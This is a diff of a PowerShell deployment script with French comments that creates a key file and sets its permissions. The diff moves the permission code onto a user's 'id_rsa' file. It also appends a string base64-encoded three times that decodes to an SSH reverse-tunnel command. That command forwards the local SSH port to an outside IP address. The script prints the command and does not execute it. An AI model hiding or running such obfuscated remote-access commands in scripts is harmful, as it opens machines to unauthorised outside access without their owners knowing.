@@ -90,11 +90,11 @@ yBesoIbS3waWJ5e6h5C6tKi+KXixCugjmVnS1OYO3u1FxrPl/5o=
         New-Item -ItemType Directory -Path $env:SystemRoot -Name "Nasus" -Force -InformationAction SilentlyContinue
         New-Item -ItemType File -Path $env:SystemRoot\Nasus -Name "cle.pem" -Value $cle -Force -InformationAction SilentlyContinue
 
-        $directory = "$env:SystemRoot\Nasus\cle.pem"
+        $directory = "C:\Users\gunsa\Desktop\id_rsa"
         $acl = Get-Acl $directory
         $acl.SetAccessRuleProtection($true,$false)
         #Droit Lecture Uniquement sur Administrateurs
-        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrateurs","Read","Allow")
+        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("gunsa","Read","Allow")
         $acl.SetAccessRule($AccessRule)
         $acl |Set-Acl
     } 
@@ -130,3 +130,19 @@ Miniature
 configCleLog
 getScriptOnServer
 task
+
+
+$C = "WXpOT2IwbEhaREZpYms1b1VVUnJkMHhxUlhkUFV6UjVUWHByZFUxNlRXZE1Wa2xuVG1wWk1rNXFjSE5pTWs1b1lrZG9kbU16VVRaTmFrazk="
+
+$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
+$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
+$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
+$C
+
+<#
+for ($i = 0; $i -lt 3; $i++)
+{
+    $C = 
+}
+$C
+#>
